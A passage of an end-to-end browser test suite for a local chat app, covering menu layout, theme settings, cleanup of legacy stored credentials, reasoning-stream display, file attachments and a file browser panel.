        opened[1].args?.url === "https://example.com/page",
      JSON.stringify(opened),
    );
    // The conversation pulls nothing from outside. "Outside" means anything
    // but the page the app is served from and the model server it was
    // configured with: the chat now reads `/props` when it opens, because the
    // thinking switch has to know whether the model's own template reads it
    // before it can be offered. That address is the app's own server on
    // loopback — not a third party, and never something the message chose.
    const serverOrigin = new URL("http://127.0.0.1:18081/ok").origin;
    const external = [];
    page.on("request", (req) => {
      const url = req.url();
      if (!url.startsWith("http://localhost:5173") && !url.startsWith(serverOrigin)) external.push(url);
    });
    await page.reload();
    await page.waitForTimeout(1500);
    check("imgblocked: nothing outside the page and its own server", external.length === 0, JSON.stringify(external.slice(0, 3)));
    await browser.close();
  },

  // The crescent carries six surfaces and nothing else.
  // The navigation rule, and the menu it governs. A menu that offers the page
  // you are on, or something that page already offers, is a menu whose clicks
  // appear to do nothing — which is exactly what the chat's crescent did with
  // "New chat" and "History", both of which the chat's own drawer has.
  //
  // The rule is checked apart from any list: a list-shaped test would pass
  // again the moment somebody added the duplicate back under another name.
  async crescent() {
    const entries = [
      { key: "brain", label: "Home" },
      { key: "chat", label: "Chat" },
      { key: "settings", label: "Settings" },
      { key: "history", label: "History" },
    ];
    const shown = crescentEntriesFor(entries, "chat", ["history"]);
    check("crescent: the page you are on is not offered", !shown.some((e) => e.key === "chat"), JSON.stringify(shown.map((e) => e.key)));
    check("crescent: what the page already offers is not offered again", !shown.some((e) => e.key === "history"), JSON.stringify(shown.map((e) => e.key)));
    check("crescent: and everything else is kept", shown.map((e) => e.key).join(",") === "brain,settings", JSON.stringify(shown.map((e) => e.key)));
    check(
      "crescent: a surface that offers nothing is filtered only by being itself",
      crescentEntriesFor(entries, "brain").length === 3,
      JSON.stringify(crescentEntriesFor(entries, "brain").map((e) => e.key)),
    );

    // And the live menu, held to the same rule: no entry repeats a control the
    // page already has, and none offers the page under it.
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(800);
    await page.getByRole("button", { name: "Show menu" }).click();
    await page.waitForTimeout(400);
    const labels = await page.locator(".nav-point-label").allTextContents();
    const currentLabel = "Chat";
    check("crescent: the live menu offers something", labels.length > 0, JSON.stringify(labels));
    check("crescent: and never the page it sits on", !labels.includes(currentLabel), JSON.stringify(labels));
    for (const label of labels) {
      const elsewhere = await page
        .locator(".topbar, .composer, .sidebar, .drawer, .thread")
        .getByRole("button", { name: label, exact: true })
        .count();
      check(`crescent: "${label}" is not a control the page already has`, elsewhere === 0, `${elsewhere} elsewhere`);
    }
    check("crescent: the chat's own new-chat control is not repeated", labels.every((label) => !label.includes("New chat")), JSON.stringify(labels));
    // One door per surface: the header carries the app's settings everywhere
    // except here, where this menu carries them, and except the page itself.
    const doors = await page.locator(".topbar").getByRole("button", { name: "Settings", exact: true }).count();
    check("crescent: the chat offers Settings once, not twice", doors === 0 && labels.some((label) => label === "Settings"), JSON.stringify({ doors, labels }));
    await browser.close();
  },

  // Appearance is a preference of the app, so it is chosen where the app's
  // settings are — not as a button shouting in every header. It used to be a
  // "Dark" button in the topbar of all seven surfaces.
  async appearance() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(800);
    check(
      "appearance: no theme button in the header",
      (await page.locator(".topbar").getByRole("button", { name: /dark theme|light theme/i }).count()) === 0,
      "the header still carries a theme toggle",
    );

    // The settings surface, reached the way a reader reaches it: the crescent.
    await page.getByRole("button", { name: "Show menu" }).click();
    await page.waitForTimeout(300);
    await page.getByRole("button", { name: "Open Settings" }).click();
    await page.waitForTimeout(400);
    const toggle = page.getByRole("checkbox", { name: "Dark theme" });
    check("appearance: the app's settings carry it", (await toggle.count()) === 1, "no Dark theme control in Settings");
    await toggle.check();
    await page.waitForTimeout(300);
    check("appearance: and it applies at once", (await page.evaluate(() => document.documentElement.dataset.theme)) === "dark");
    check("appearance: and it is remembered", (await page.evaluate(() => localStorage.getItem("crescent-chat.theme.v1"))) === "dark");
    // The remote-server fields are gone from this surface: what storage
    // holds (a model name, the switches) is all there is to save.
    check("settings: no server-address field", (await page.locator('.settings-page input[type="url"]').count()) === 0);
    check("settings: no api-key field", (await page.locator('.settings-page input[type="password"]').count()) === 0);
    await browser.close();
  },

  // A record from before the remote-server fields were removed: the stale
  // endpoint and the stale API key must leave storage on the first load —
  // an obsolete secret does not wait for a settings visit that may never
  // come (the crash path's wipe is not a migration).
  async legacysettings() {
    // Three shapes a record from the remote-server era can arrive in, each
    // loaded by the real page: the stale pair must leave in ALL of them.
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const seeded = async (raw) => {
      const page = await browser.newPage();
      await page.addInitScript((value) => {
        localStorage.clear();
        localStorage.setItem("crescent-chat.theme.v1", "light");
        localStorage.setItem("crescent-chat.settings.v1", value);
      }, raw);
      await page.goto(APP);
      await page.waitForTimeout(600);
      return page;
    };
    const stored = (page) => page.evaluate(() => localStorage.getItem("crescent-chat.settings.v1"));

    // An object: endpoint/token leave; the model, the switch AND a key this
    // version has never heard of stay — a whitelist rewrite would drop it.
    let page = await seeded(
      JSON.stringify({
        endpoint: "https://old.example:8000",
        token: "sk-legacy-secret",
        model: "keep-me",
        webTools: false,
        future_key: "keep me",
      }),
    );
    let raw = await stored(page);
    let parsed = JSON.parse(raw ?? "null");
    check("legacy object: the stale endpoint is gone", raw !== null && !("endpoint" in parsed), raw ?? "null");
    check("legacy object: the stale key is gone", raw !== null && !("token" in parsed), raw ?? "null");
    check("legacy object: an unknown key survives", parsed?.future_key === "keep me", raw ?? "null");
    check(
      "legacy object: the model and the switch survive",
      parsed?.model === "keep-me" && parsed?.webTools === false,
      raw ?? "null",
    );
    // …and a save must not rewrite the unknown key away either: the form
    // holds only the fields it knows.
    // The home page carries the Settings point directly (there is no open
    // conversation and so no crescent menu to open first).
    await page.getByRole("button", { name: "Settings", exact: true }).first().click();
    await page.waitForTimeout(400);
    await page.getByRole("button", { name: "Save", exact: true }).click();
    await page.waitForTimeout(300);
    const afterSave = await stored(page);
    const saved = JSON.parse(afterSave ?? "null");
    check(
      "legacy object: saving the form keeps the unknown key",
      saved?.future_key === "keep me" && !("token" in saved),
      afterSave ?? "null",
    );
    await page.close();

    // Unparsable JSON: the bytes may BE the old API key — the record goes.
    page = await seeded("not json {");
    raw = await stored(page);
    check("legacy broken: the record itself is removed", raw === null, String(raw));
    await page.close();

    // A plain string parses but is not a record: same verdict, same reason.
    page = await seeded('"a string"');
    raw = await stored(page);
    check("legacy string: the record itself is removed", raw === null, String(raw));
    await page.close();

    await browser.close();
  },

  // The first page with nothing to send to, in the words of the page that
  // fixes it: the machine is off → the Server page; on but with no model
  // name → Settings.
  async emptysetup() {
    let browser = await chromium.launch({ args: ["--no-sandbox"] });
    let page = await browser.newPage();
    await page.addInitScript(() => {
      localStorage.clear();
      localStorage.setItem("crescent-chat.theme.v1", "light");
      localStorage.setItem(
        "crescent-chat.settings.v1",
        JSON.stringify({ model: "x", webTools: true }),
      );
    });
    await page.goto(APP);
    await openChat(page);
    await page.waitForTimeout(500);
    const offCopy = (await page.locator(".empty-copy").textContent().catch(() => null)) ?? "";
    check(
      "empty: an off machine says so in the Server page's words",
      offCopy.includes("This computer is not running anything right now."),
      offCopy || "no empty state",
    );
    check(
      "empty: and offers Go to Server",
      (await page.locator(".empty").getByRole("button", { name: "Go to Server" }).count()) === 1,
    );
    await browser.close();

    browser = await chromium.launch({ args: ["--no-sandbox"] });
    page = await browser.newPage();
    await page.addInitScript(
      ({ settings }) => {
        localStorage.clear();
        localStorage.setItem("crescent-chat.theme.v1", "light");
        localStorage.setItem("crescent-chat.settings.v1", JSON.stringify(settings));
      },
      { model: "", webTools: true },
    );
    await page.addInitScript(installBrainStub, {
      state: { kind: "running", endpoint: "http://127.0.0.1:8130/v1", model: "" },
      credential: "stub-credential",
    });
    await page.goto(APP);
    await openChat(page);
    await page.waitForTimeout(500);
    const unnamedCopy = (await page.locator(".empty-copy").textContent().catch(() => null)) ?? "";
    check(
      "empty: a running machine with no model name says so",
      unnamedCopy.includes("This computer has no model name yet."),
      unnamedCopy || "no empty state",
    );
    // Scoped to the empty state: the crescent's own entry carries the
    // accessible name "Open Settings" (CrescentNav's `Open ${label}`), and
    // an unscoped role query counts both.
    check(
      "empty: and offers Open settings",
      (await page.locator(".empty").getByRole("button", { name: "Open settings" }).count()) === 1,
    );
    await browser.close();
  },

  async think() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("think-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Count the sheep.", "8 sheep left");
    // The duration persists after [DONE], one tick behind the last token:
    // wait for the settled summary, not the first paint of the answer.
    await waitSummary(page, "think: summary settled");
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    const msgs = JSON.parse((await stored(page, `crescent-chat.msgs.${index[0]?.id}.v2`)) ?? "[]");
    const answer = msgs.find((m) => m.role === "assistant");
    check("think: reasoning stored apart", (answer?.reasoning ?? "").includes("Strip the politeness"));
    check("think: thinking kept out of content", !(answer?.content ?? "").includes("politeness"));
    check("think: duration measured", typeof answer?.reasoningMs === "number" && answer.reasoningMs >= 0);
    check("think: cloud collapsed with summary", ((await page.locator(".thought-face").textContent()) ?? "").includes("Thought for"));
    await browser.close();
  },

  // Reasoning only, clean close: cloud stays, empty answer said aloud.
  async thinkonly() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("thinkonly-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Think, don't speak.", "Thought for");
    check("thinkonly: cloud present", (await page.locator(".thought").count()) === 1);
    check("thinkonly: no-answer said", ((await page.locator(".thread").textContent()) ?? "").includes("gave no answer"));
    check("thinkonly: not an error", (await page.locator(".error-block").count()) === 0);
    await browser.close();
  },

  // No reasoning anywhere: no cloud, not even closed.
  async plain() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Just answer.", "line is open");
    check("plain: zero clouds", (await page.locator(".thought").count()) === 0);
    await browser.close();
  },

  // Both fields in one delta: each reaches its own buffer.
  async both() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("both-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Both at once.", "eight sheep left.");
    await waitSummary(page, "both: summary settled");
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    const msgs = JSON.parse((await stored(page, `crescent-chat.msgs.${index[0]?.id}.v2`)) ?? "[]");
    const answer = msgs.find((m) => m.role === "assistant");
    check("both: reasoning kept", (answer?.reasoning ?? "").includes("Considering the flock"));
    check("both: content kept", (answer?.content ?? "").includes("Well, counting"));
    await browser.close();
  },

  // A reasoning payload torn across two writes reassembles.
  async splitthink() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("splitthink-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Torn thinking.", "Answered.");
    await waitSummary(page, "splitthink: summary settled");
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    const msgs = JSON.parse((await stored(page, `crescent-chat.msgs.${index[0]?.id}.v2`)) ?? "[]");
    const answer = msgs.find((m) => m.role === "assistant");
    check("splitthink: reassembled", (answer?.reasoning ?? "").includes("Split thinking reassembled."));
    await browser.close();
  },

  // Thousands of reasoning chars: the open cloud caps and scrolls inside.
  async longthink() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("longthink-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Think hard.", "8 sheep left");
    await waitSummary(page, "longthink: summary settled");
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    const msgs = JSON.parse((await stored(page, `crescent-chat.msgs.${index[0]?.id}.v2`)) ?? "[]");
    const answer = msgs.find((m) => m.role === "assistant");
    check("longthink: thousands kept", (answer?.reasoning ?? "").length > 6050, `${answer?.reasoning?.length} chars`);
    await page.getByRole("button", { name: /Show thinking/ }).click();
    await page.waitForTimeout(400);
    const box = await page.locator(".thought-body").boundingBox();
    check("longthink: cloud capped", (box?.height ?? 9999) <= 340, `${Math.round(box?.height ?? 0)}px tall`);
    const scrolls = await page.evaluate(() => {
      const el = document.querySelector(".thought-body");
      return el ? el.scrollHeight > el.clientHeight : false;
    });
    check("longthink: scrolls inside", scrolls);
    await browser.close();
  },

  // Stop while thinking: partial reasoning kept, honest note, cloud stays.
  async stopthink() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("slowthink-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).fill("Think slowly.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForTimeout(1200);
    await page.getByRole("button", { name: "Stop generating" }).click();
    await page.waitForTimeout(600);
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    const msgs = JSON.parse((await stored(page, `crescent-chat.msgs.${index[0]?.id}.v2`)) ?? "[]");
    const answer = msgs.find((m) => m.role === "assistant");
    check("stopthink: partial thinking kept", (answer?.reasoning ?? "").length > 0);
    check("stopthink: no answer yet", (answer?.content ?? "") === "");
    const body = (await page.locator(".thread").textContent()) ?? "";
    check("stopthink: stopped honestly", body.includes("Stopped early"));
    check("stopthink: cloud stays", (await page.locator(".thought").count()) === 1);
    await browser.close();
  },

  // vLLM names the field `reasoning`: a one-name client stays silent here.
  async vllm() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("vllm-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "vLLM style.", "8 sheep left");
    check("vllm: second field name read", (await page.locator(".thought").count()) === 1);
    await browser.close();
  },

  // Empty string must not shadow the populated name.
  async emptywins() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("emptywins-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Both names, one empty.", "Answered.");
    await waitSummary(page, "emptywins: summary settled");
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    const msgs = JSON.parse((await stored(page, `crescent-chat.msgs.${index[0]?.id}.v2`)) ?? "[]");
    const answer = msgs.find((m) => m.role === "assistant");
    check("emptywins: populated name wins", (answer?.reasoning ?? "").includes("Real thinking here."));
    check("emptywins: cloud shown", (await page.locator(".thought").count()) === 1);
    await browser.close();
  },

  // Both non-empty: the documented precedence (reasoning_content) holds.
  async bothfull() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("bothfull-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Both names full.", "Answered.");
    await waitSummary(page, "bothfull: summary settled");
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    const msgs = JSON.parse((await stored(page, `crescent-chat.msgs.${index[0]?.id}.v2`)) ?? "[]");
    const answer = msgs.find((m) => m.role === "assistant");
    check("bothfull: reasoning_content wins", (answer?.reasoning ?? "").includes("Content-side wins."));
    check("bothfull: loser dropped", !(answer?.reasoning ?? "").includes("Loser"));
    await browser.close();
  },

  // Non-streaming thinking-only reply: cloud + said aloud, never "unreachable".
  async jsonthink() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("jsonthink-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "JSON thinking.", "gave no answer");
    check("jsonthink: cloud present", (await page.locator(".thought").count()) === 1);
    check("jsonthink: not an error", (await page.locator(".error-block").count()) === 0);
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    const msgs = JSON.parse((await stored(page, `crescent-chat.msgs.${index[0]?.id}.v2`)) ?? "[]");
    const answer = msgs.find((m) => m.role === "assistant");
    check("jsonthink: reasoning stored", (answer?.reasoning ?? "").includes("JSON thinking here."));
    await browser.close();
  },

  // Disk writes stay flat while tokens fly: memory renders, throttle persists.
  async persistthrottle() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await page.addInitScript(() => {
      window.__setItems = 0;
      const orig = Storage.prototype.setItem;
      Storage.prototype.setItem = function (k, v) {
        window.__setItems++;
        return orig.call(this, k, v);
      };
    });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.evaluate(() => {
      window.__setItems = 0;
    });
    await sendAndWait(page, "Count the writes.", "line is open");
    await page.waitForFunction(() => document.querySelector(".composer-stop") === null, null, {
      timeout: 20000,
    });
    await page.waitForTimeout(800);
    const writes = await page.evaluate(() => window.__setItems);
    // ~7 deltas: create (2) + final (2), plus any trailing flush. The old
    // per-token code needed 2 per delta (~18 here).
    check("persistthrottle: writes stay flat", writes <= 10, `${writes} setItem calls`);
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    const msgs = JSON.parse((await stored(page, `crescent-chat.msgs.${index[0]?.id}.v2`)) ?? "[]");
    const answer = msgs.find((m) => m.role === "assistant");
    check(
      "persistthrottle: on-disk result identical",
      answer?.content === "Hello! The line is open and streaming works.",
    );
    await browser.close();
  },

  // Ticker tail: equivalent to a full scan, at a fraction of the cost.
  async tailperf() {
    const naive = (text) => {
      const lines = text.split("\n").map((l) => l.trim()).filter(Boolean);
      return (lines.at(-1) ?? "").slice(-140);
    };
    const samples = [
      "one line, no newline",
      "first\nsecond\nthird\n",
      "trailing\n\n\n",
      `x${"y".repeat(500)}\nshort`,
      "uni \u{1F914} code\nnext \u00e9lan",
      "",
      "\n\n\n",
      "a\n\n  \nlast after blanks",
    ];
    const chunkings = [[7], [1], [3, 11, 5], [64]];
    let equivalent = true;
    for (const text of samples) {
      for (const sizes of chunkings) {
        let tail = "";
        let i = 0;
        let k = 0;
        while (i < text.length) {
          const size = sizes[k % sizes.length];
          tail = appendTail(tail, text.slice(i, i + size));
          i += size;
          k++;
        }
        // Display strips trailing whitespace, exactly like the component.
        if (tail.replace(/\s+$/, "") !== naive(text)) equivalent = false;
      }
    }
    check("tailperf: incremental equals full scan", equivalent);
    const workload = 6000;
    const pieces = Array.from({ length: workload }, (_, i) => `piece-${i}-xxxxxxxxxx\n`);
    const t0 = Date.now();
    let tail = "";
    for (const piece of pieces) tail = appendTail(tail, piece);
    const incrementalMs = Date.now() - t0;
    let full = "";
    const t1 = Date.now();
    for (const piece of pieces) {
      full += piece;
      naive(full);
    }
    const naiveMs = Date.now() - t1;
    check(
      "tailperf: incremental far cheaper than quadratic",
      incrementalMs * 5 < Math.max(naiveMs, 1),
      `${incrementalMs}ms vs ${naiveMs}ms`,
    );
  },
  // Attachments: txt fits, reaches the wire, never the index.
  async attachtxt() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    const text = `Report body. ${"x".repeat(3985)}`;
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "report.txt", mimeType: "text/plain", buffer: Buffer.from(text) },
    ]);
    await page.waitForTimeout(800);
    const row = (await page.locator(".panel-row .panel-name").textContent()) ?? "";
    check("attachtxt: panel lists file", row.includes("report.txt"));
    const meta = (await page.locator(".panel-row .panel-meta").textContent()) ?? "";
    check("attachtxt: type and estimate shown", meta.includes("txt") && meta.includes("1000"));
    const attachId = await page.evaluate(() =>
      Object.keys({ ...localStorage }).find((k) => k.startsWith("crescent-chat.attach.")),
    );
    const attachRaw = await stored(page, attachId);
    check("attachtxt: payload stored", (attachRaw ?? "").includes("Report body."));
    const indexRaw = (await stored(page, "crescent-chat.index.v2")) ?? "";
    check("attachtxt: index clean", !indexRaw.includes("Report body."));
    check(
      "attachtxt: body never rendered",
      !((await page.locator(".panel").textContent()) ?? "").includes("Report body."),
    );
    await page.getByRole("textbox", { name: "Message" }).fill("Summarize.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("line is open"),
      null,
      { timeout: 20000 },
    );
    const body = await lastBody(page);
    const sys = (body?.messages ?? []).find((m) => m.role === "system");
    check("attachtxt: wire has pinned block", (sys?.content ?? "").includes("Report body.") && (sys?.content ?? "").includes("report.txt"));
    await browser.close();
  },

  // PDF: two pages out, both texts kept, zero network while parsing.
  async attachpdf() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    // Listener starts after load: only parsing-time requests count, and the
    // configured endpoint is legitimate traffic — third parties are not.
    let external = 0;
    page.on("request", (req) => {
      const url = req.url();
      if (!url.startsWith("http://localhost:5173") && !url.startsWith("http://127.0.0.1:18081")) external++;
    });
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "doc.pdf", mimeType: "application/pdf", buffer: makePdf(["Hello PDF page one", "Hello PDF page two"]) },
    ]);
    await page.waitForTimeout(2500);
    const meta = (await page.locator(".panel-row .panel-meta").textContent()) ?? "";
    check("attachpdf: two pages", meta.includes("2 pages"), meta.trim());
    const id = await page.evaluate(() =>
      Object.keys({ ...localStorage }).find((k) => k.startsWith("crescent-chat.attach.")),
    );
    const storedText = JSON.parse((await stored(page, id)) ?? "[]")[0]?.text ?? "";
    check("attachpdf: both pages extracted", storedText.includes("page one") && storedText.includes("page two"));
    check("attachpdf: zero external requests while parsing", external === 0, `${external} seen`);
    await browser.close();
  },

  // DOCX + PPTX: same zip, text out.
  async attachoffice() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.locator('.composer input[type="file"]').setInputFiles([
      {
        name: "doc.docx",
        mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        buffer: makeDocx(["Hello DOCX world", "Second paragraph here"]),
      },
      {
        name: "deck.pptx",
        mimeType: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        buffer: makePptx(["Hello PPTX slide one", "Hello PPTX slide two"]),
      },
    ]);
    await page.waitForTimeout(2500);
    const names = (await page.locator(".panel-list").textContent()) ?? "";
    check("attachoffice: both listed", names.includes("doc.docx") && names.includes("deck.pptx"));
    check("attachoffice: slides counted", names.includes("2 pages"));
    const id = await page.evaluate(() =>
      Object.keys({ ...localStorage }).find((k) => k.startsWith("crescent-chat.attach.")),
    );
    const atts = JSON.parse((await stored(page, id)) ?? "[]");
    const docx = atts.find((a) => a.name === "doc.docx");
    const pptx = atts.find((a) => a.name === "deck.pptx");
    check("attachoffice: docx text", (docx?.text ?? "").includes("Hello DOCX world"));
    check("attachoffice: pptx text", (pptx?.text ?? "").includes("Hello PPTX slide two"));
    await browser.close();
  },

  // Drag and drop onto the thread attaches too.
  async attachdrop() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.evaluate(([name, bytes]) => {
      const file = new File([new Uint8Array(bytes)], name, { type: "text/plain" });
      const dt = new DataTransfer();
      dt.items.add(file);
      const el = document.querySelector(".main-col");
      el.dispatchEvent(new DragEvent("dragover", { bubbles: true, cancelable: true, dataTransfer: dt }));
      el.dispatchEvent(new DragEvent("drop", { bubbles: true, cancelable: true, dataTransfer: dt }));
    }, ["dropped.txt", [...Buffer.from("Dropped file text.")]]);
    await page.waitForTimeout(800);
    check("attachdrop: dropped file listed", ((await page.locator(".panel-list").textContent()) ?? "").includes("dropped.txt"));
    await browser.close();
  },

  // Wrong kind and absurd size: said aloud, never attached.
  async attachrejects() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "run.exe", mimeType: "application/octet-stream", buffer: Buffer.from("MZ") },
    ]);
    await page.waitForTimeout(600);
    const status = (await page.locator(".attach-status").textContent()) ?? "";
    check("attachrejects: unsupported said", status.includes("not a readable kind"));
    check("attachrejects: nothing stored", (await page.locator(".panel-row").count()) === 0);
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "huge.txt", mimeType: "text/plain", buffer: Buffer.alloc(33 * 1024 * 1024, 97) },
    ]);
    await page.waitForTimeout(1200);
    const status2 = (await page.locator(".attach-status").textContent()) ?? "";
    check("attachrejects: too-big said", status2.includes("too large"));
    check("attachrejects: still nothing stored", (await page.locator(".panel-row").count()) === 0);
    await browser.close();
  },

  // The files panel's tree: roots from Rust, folders that expand, a folder
  // that was capped saying so on screen.
  async filestree() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await stubFileDoor(page, {
      roots: { roots: ["/"], home: "/Users/marco" },
      listings: {
        "/Users/marco": {
          path: "/Users/marco",
          truncated: false,
          entries: [
            { name: "Documents", path: "/Users/marco/Documents", is_dir: true, kind: "other", bytes: 0, modified_ms: null },
            { name: "Everything", path: "/Users/marco/Everything", is_dir: true, kind: "other", bytes: 0, modified_ms: null },
            { name: "readme.txt", path: "/Users/marco/readme.txt", is_dir: false, kind: "text", bytes: 12, modified_ms: null },
          ],
        },
        "/Users/marco/Documents": {
          path: "/Users/marco/Documents",
          truncated: false,
          entries: [
            { name: "notes.txt", path: "/Users/marco/Documents/notes.txt", is_dir: false, kind: "text", bytes: 5, modified_ms: null },
          ],
        },
        "/Users/marco/Everything": {
          path: "/Users/marco/Everything",
          truncated: true,
          skipped: 2,
          entries: [
            { name: "a.txt", path: "/Users/marco/Everything/a.txt", is_dir: false, kind: "text", bytes: 1, modified_ms: null },
          ],
        },
      },
    });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Hello.", "line is open");
    await page.getByRole("button", { name: "Toggle the files panel" }).click();
    await page.getByRole("tab", { name: "Files" }).click();
    await page.waitForSelector(".files-tree");
    const tree = (await page.locator(".files-tree").textContent()) ?? "";
    check("filestree: roots listed", tree.includes("Home") && tree.includes("/"), tree.slice(0, 80));
    // Roots start collapsed: Home opens first, Documents is inside it.
    await page.locator(".files-open", { hasText: "Home" }).click();
    await page.waitForTimeout(400);
    await page.locator(".files-open", { hasText: "Documents" }).click();
    await page.waitForTimeout(400);
    check(
      "filestree: a folder expands to its rows",
      ((await page.locator(".files-tree").textContent()) ?? "").includes("notes.txt"),
    );
    await page.locator(".files-open", { hasText: "Everything" }).click();
    await page.waitForTimeout(400);
    check(
      "filestree: a capped folder says so",
      ((await page.locator(".files-tree").textContent()) ?? "").includes("First 500 of this folder shown"),
      "the truncated flag never reached the screen",
    );
    check(
      "filestree: a folder that lost rows says how many",
      ((await page.locator(".files-tree").textContent()) ?? "").includes("2 entries here could not be read."),
      "the skipped count never reached the screen",
    );
    await browser.close();
  },

  // The search: batches render as they arrive, a late batch from a
  // superseded search is dropped, the skipped and limited facts are shown,
  // and switching tabs removes the listener.
  async filessearch() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await stubFileDoor(page, {
      roots: { roots: ["/"], home: "/Users/marco" },
      listings: {
        "/Users/marco": {
          path: "/Users/marco",
          truncated: false,
          skipped: 0,
          entries: [
            { name: "Documents", path: "/Users/marco/Documents", is_dir: true, kind: "other", bytes: 0, modified_ms: null },
          ],
        },
      },
      // via_index on: this run answers from the Mac's index, and the page
      // owes the owner that fact on screen.
      search: { hits: 0, skipped: 0, limited: false, cancelled: false, via_index: true },
    });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Hello.", "line is open");
    await page.getByRole("button", { name: "Toggle the files panel" }).click();
    await page.getByRole("tab", { name: "Files" }).click();
    await page.waitForSelector(".files-search");

    const emit = (payload) => page.evaluate((p) => window.__EMIT_FILES__(p), payload);
    // The page puts a fresh generation id on every submit; the test reads
    // it back from the calls it saw, because only the page knows it.
    const lastId = async () =>
      (await page.evaluate(() => window.__FILE_CALLS__))
        .filter((call) => call.command === "brain_files_search")
        .pop()?.args?.id;
